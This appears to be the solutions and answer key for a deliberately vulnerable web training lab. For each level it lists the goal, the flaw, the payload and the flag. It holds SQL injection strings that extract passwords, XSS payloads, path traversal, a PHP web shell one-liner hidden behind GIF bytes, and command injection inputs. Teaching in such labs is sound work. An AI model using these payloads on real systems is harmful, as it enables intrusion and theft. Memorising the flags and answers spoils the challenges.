# 🔐 VulnForge Academy - Challenge Solutions & Answer Key

This document contains the **solutions and answers** for the challenges in VulnForge Academy. 
> **Warning:** This is for educational purposes and testing. Try to solve the challenges yourself first!

---

## 🎟️ Invite Code Challenge (Registration)

**Goal:** Generate a valid invite code to register an account.

### Solution
1. **Navigate to:** `/invite.html`
2. **Challenge:** You are asked to enter a "checksum" in the terminal.
3. **Hint:** The checksum is the sum of the ASCII values of the string "VULNFORGE".
   - V (86) + U (85) + L (76) + N (78) + F (70) + O (79) + R (82) + G (71) + E (69)
4. **Answer:** `696`
5. **Action:** Enter `696` in the terminal and press Enter.
6. **Result:** You will receive a valid invite code (e.g., `VULN-ABCD-1234-EFGH`).

---

## 🔑 Admin Access (Privilege Escalation)

**Goal:** Register an account with Administrator privileges.

### Solution
1. **Navigate to:** `/register.html`
2. **Challenge:** Register normally, but use a specific "Master Key" as the invite code.
3. **Answer (Invite Code):** `ADMIN-SECRET-KEY`
4. **Action:** Enter `ADMIN-SECRET-KEY` into the "Invite Code" field during registration.
5. **Result:** Your account will be created with the rank **"Admin"**, granting access to restricted areas.

---

## 💉 SQL Injection (SQLi)

**Base URL:** `/api/levels/sqli`

### Level 1: Basic Bypass
*   **Goal:** Bypass authentication or view data without a valid username.
*   **Vulnerability:** Direct string concatenation.
*   **Payload:** `' OR '1'='1`
*   **Result:** Returns all users in the database.

### Level 2: UNION Attack
*   **Goal:** Extract data from other tables (like passwords).
*   **Vulnerability:** UNION-based injection.
*   **Payload:** `1 UNION SELECT id, username, password FROM users--`
*   **Result:** Appends user credentials to the product list.

### Level 3: Error-Based
*   **Goal:** Extract data using error messages.
*   **Vulnerability:** Verbose database errors.
*   **Payload:** `1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), 0x3a, floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)--` or simpler `id; SELECT * FROM flags--`
*   **Result:** Returns database version or table contents in the error message.

---

## 💀 Cross-Site Scripting (XSS)

**Base URL:** `/api/levels/xss`

### Level 4: Reflected XSS
*   **Goal:** Execute JavaScript by manipulating the URL.
*   **Vulnerability:** Input is reflected directly in the page.
*   **Payload:** `<script>alert('XSS')</script>`
*   **URL:** `/api/levels/xss/level4?name=<script>alert('XSS')</script>`

### Level 6: DOM-Based XSS
*   **Goal:** Execute JavaScript via the URL fragment (hash).
*   **Vulnerability:** Unsafe usage of `window.location.hash`.
*   **Payload:** `#<img src=x onerror=alert('XSS')>`
*   **URL:** `/api/levels/xss/level6#<img src=x onerror=alert('XSS')>`
*   **Flag:** `FLAG{xss6_d0m_m4n1pul4t10n}` (Found in page source)

---

## 🕵️ Insecure Direct Object Reference (IDOR)

**Base URL:** `/api/levels/idor`

### Level 7: User Profile
*   **Goal:** Access another user's profile.
*   **Vulnerability:** ID parameter is not validated against the logged-in user.
*   **Payload:** Change `user_id` in URL to `1` (Admin).
*   **URL:** `/api/levels/idor/level7/user/1`
*   **Flag:** `FLAG{idor7_us3r_pr0f1l3}`

### Level 8: Order Details
*   **Goal:** View hidden order information.
*   **Vulnerability:** Predictable order IDs.
*   **Payload:** Access order ID `3` (Enterprise Plan).
*   **URL:** `/api/levels/idor/level8/order/3`
*   **Flag:** `FLAG{idor8_4p1_3xp0s3d}`

### Level 9: File Access / Path Traversal
*   **Goal:** Read a secret file from the server.
*   **Vulnerability:** Filename parameter allows directory traversal or direct access.
*   **Payload:** `secret.txt`
*   **URL:** `/api/levels/idor/level9/file?filename=secret.txt`
*   **Flag:** `FLAG{idor9_f1l3_4cc3ss}`

---

## 📂 File Upload Vulnerabilities

**Base URL:** `/api/levels/upload`

### Level 16: Extension Bypass
*   **Goal:** Upload a file with a dangerous extension.
*   **Vulnerability:** Incomplete blacklist (only blocks `.php`, `.exe`, etc.).
*   **Payload:** Rename your file to `exploit.php5`, `exploit.phtml`, or `exploit.phar`.
*   **Result:** Upload success.
*   **Flag:** `FLAG{upload16_3xt3ns10n}`

### Level 17: Content-Type Bypass
*   **Goal:** Upload a PHP file by spoofing the content type.
*   **Vulnerability:** Server trusts the `Content-Type` header sent by the client.
*   **Payload:** Upload `shell.php` but intercept the request (e.g., using Burp Suite) and change `Content-Type: application/x-php` to `Content-Type: image/jpeg`.
*   **Result:** Upload success.
*   **Flag:** `FLAG{upload17_c0nt3nt_typ3}`

### Level 18: Magic Bytes (Polyglot)
*   **Goal:** Upload a file that looks like an image but contains code.
*   **Vulnerability:** Server checks "magic bytes" (file header) but not the full content.
*   **Payload:** Create a file starting with `GIF89a;` followed by `<?php system($_GET['cmd']); ?>`.
*   **Result:** Recognized as a valid GIF image.
*   **Flag:** `FLAG{upload18_m4g1c_byt3s}`

---

## ⚡ Remote Code Execution (RCE)

**Base URL:** `/api/levels/rce`

### Level 19: Command Injection
*   **Goal:** Execute system commands on the server.
*   **Vulnerability:** User input is passed directly to a system shell.
*   **Payload:** `127.0.0.1 & whoami` (Windows) or `127.0.0.1; id` (Linux).
*   **URL:** `/api/levels/rce/level19?host=127.0.0.1%20%26%20type%20backend-python\\routers\\rce.py` (to read file)
*   **Flag:** `FLAG{rce19_c0mm4nd_1nj}` (Triggered by successful injection)

### Level 20: The Final Boss
*   **Goal:** Chain multiple vulnerabilities.
*   **Vulnerability:** Logic allows chaining SQLi, SSRF, and RCE.
*   **Payload:** Set action to `chain` and target to a string containing `sqli`, `ssrf`, and `rce`.
*   **URL:** `/api/levels/rce/level20?action=chain&target=exploit_sqli_ssrf_rce`
*   **Flag:** `FLAG{nightmare20_ch41n_m4st3r}`
